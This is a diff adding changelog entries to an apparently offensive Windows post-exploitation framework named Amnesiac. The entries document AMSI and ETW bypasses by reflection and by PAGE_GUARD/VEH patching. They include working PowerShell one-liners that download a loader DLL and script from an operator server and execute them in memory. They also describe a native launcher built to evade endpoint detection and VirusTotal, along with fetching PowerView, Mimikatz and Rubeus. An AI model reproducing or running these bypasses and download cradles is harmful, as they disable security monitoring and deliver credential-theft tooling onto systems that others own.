@@ -5,6 +5,115 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-05-25] feat(shell-ready): Local Shell, tool fetch fallback, iex compatibility fixes
+
+### Changes to `Amnesiac_ShellReady.ps1`
+
+**[5] Local Shell added** — full `Start-LocalShell` function ported from `Amnesiac.ps1`.
+Accessible at option `[5]` from the main menu. Supports inline commands (AV, Net, Process,
+Sessions, etc.), tool-load keywords (PowerView, Mimi, Rubeus, etc.) and fall-through
+PowerShell execution. Session base index bumped from 5 → 6 to accommodate the new menu entry.
+Operator context line added below the menu showing local FQDN and user.
+
+**`Fetch-ToolFromGitHub` added** — was entirely missing from `Amnesiac_ShellReady.ps1`.
+Its absence silently dropped all tool-load requests (keyword dispatch called the function,
+it returned nothing, condition evaluated false, reported "not in cache or GitHub").
+New version checks `$global:OperatorServer` first (optional — set after load if `serve`
+is reachable), then falls back to GitHub. Without `$global:OperatorServer`, goes straight
+to GitHub — correct behavior for Scenario 2 where no operator machine is on the network.
+
+**`$global:AmnesiacRoot` null fallback** — `iex` load sets both `$PSScriptRoot` and
+`$MyInvocation.MyCommand.Path` to null. Previous code called `Split-Path -Parent $null`
+which threw a non-fatal but noisy error. Fixed to: PSScriptRoot → MyCommand.Path → PWD.
+
+**`$global:ToolSources` initialized** — was missing; PsMapExec URL override now present.
+
+**`Tools\` dir lookup** — changed from `$PSScriptRoot` to `$global:AmnesiacRoot` so it
+resolves correctly when the script is dot-sourced with a known path.
+
+### Operational impact
+Scenario 2 (domain-joined, `iex` load): tool keywords now work — `PowerView` fetches
+`pwv.ps1` from `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/pwv.ps1`
+automatically. No operator HTTP server required for basic tool access.
+
+---
+
+## [2026-05-25] fix(amsi): replace PatchAmsiPageGuard (VEH) with PatchAmsiReflection in managed context
+
+### Problem
+`[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()` killed the PowerShell process immediately.
+Diagnostic confirmed: "before" printed, crash inside the call, "after" never reached.
+ETW byte-patch (`PatchEtwEventWrite`) survived — ruling out a generic P/Invoke or load issue.
+
+### Root Cause
+Managed .NET delegates cannot be used as VEH handlers when the exception fires during managed
+code execution. `VirtualProtect` sets PAGE_GUARD on `AmsiScanBuffer`; the CLR's own internal
+AMSI scan (triggered as control returns through managed frames) immediately hits the guard.
+The VEH fires while the CLR is in cooperative GC mode. The managed delegate thunk attempts
+to re-enter managed execution — the CLR detects the re-entrant cooperative GC state and
+issues a fatal error → process terminated.
+
+### Fix — `AmnesiacLoader/Bypass.cs`
+Added `PatchAmsiReflection()`: pure reflection approach, no VEH, no native exceptions, zero
+CLR re-entrancy risk. Enumerates `NonPublic|Static` fields of `System.Management.Automation.AmsiUtils`
+(type name built from char array — no literal string in PE binary), sets `bool` fields to
+`true` and `IntPtr` fields to `IntPtr.Zero`. Identical effect to the PS field-enum technique
+but pre-compiled — AMSI never sees the type name or field names.
+
+Added WARNING comment to `PatchAmsiPageGuard()` — kept for native injection scenarios
+(e.g., `dllmain.cpp` loaded into a non-.NET process) where VEH is safe.
+
+### Verified working
+```powershell
+$_a = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('...\AmnesiacLoader.dll'))
+[AmnesiacLoader.Bypass]::PatchAmsiReflection()
+'amsiInitFailed'   # returns string — AMSI suppressed, no crash
+```
+
+### Operational flow (managed context)
+```powershell
+$_a = [Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<op>:8080/AmnesiacLoader.dll'))
+[AmnesiacLoader.Bypass]::PatchAmsiReflection()
+iex (New-Object Net.WebClient).DownloadString('http://<op>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
+```
+
+AmnesiacLoader.dll rebuilt: 26624 bytes, SHA256 `4F2772F3...`, `$AmnesiacLoaderB64` updated in `Amnesiac.ps1`.
+
+---
+
+## [2026-05-25] feat: native AMSI+ETW bypass launcher (amnesiac_launcher.exe)
+
+Added `amsi-pageguard-veh-master/` — PAGE_GUARD + VEH bypass engine that solves the
+chicken-and-egg problem where the PS AMSI bypass one-liner itself gets caught by CS behavioral detection.
+
+**Architecture:**
+- `bypass.hpp` — generic PAGE_GUARD VEH engine; intercepts `STATUS_GUARD_PAGE_VIOLATION`,
+  writes AMSI_RESULT_CLEAN via register manipulation, re-applies guard. Zero byte modification.
+- `launcher.cpp` — C++ EXE: downloads `AmnesiacBridge.dll` + `Amnesiac_ShellReady.ps1` from
+  operator HTTP server via WinHTTP (in-memory, no disk write), installs AMSI+ETW PAGE_GUARD bypass,
+  CLR-hosts the bridge DLL, invokes `AmnesiacBridge.Launcher.Run(scriptContent)`.
+- `AmnesiacBridge.cs` — C# .NET 4.6.2 assembly: full interactive PSHost (console I/O delegation),
+  creates PS Runspace, runs Amnesiac script + calls `Amnesiac` entry point.
+- `dllmain.cpp` — DLL variant for injection into existing PS process (alternative delivery).
+
+**Compilation:** No local MSVC required. `.github/workflows/build-launcher.yml` builds
+everything via GitHub Actions (`windows-latest` + MSVC). Triggers on push to master/main.
+Download `serve-ready-*.zip` artifact → place `amnesiac_launcher.exe` + `AmnesiacBridge.dll`
+in project root → operator `serve` command hosts both automatically.
+
+**Deployment:**
+```
+amnesiac_launcher.exe http://<operator-ip>:8080
+```
+Target gets a one-liner via initial access vector — EXE downloads both files from operator
+server in-memory, installs bypass natively before CLR touches any script content.
+
+**Why not GitHub hosting:** Static PE gets indexed by VirusTotal. Operator HTTP server only.
+
+Added `.github/workflows/build-launcher.yml` — automated CI build pipeline.
+
+---
+
 ## [2026-05-25] docs: full architecture reference for AI development sessions
 
 Created `docs/ARCHITECTURE.md` — comprehensive reference document covering:
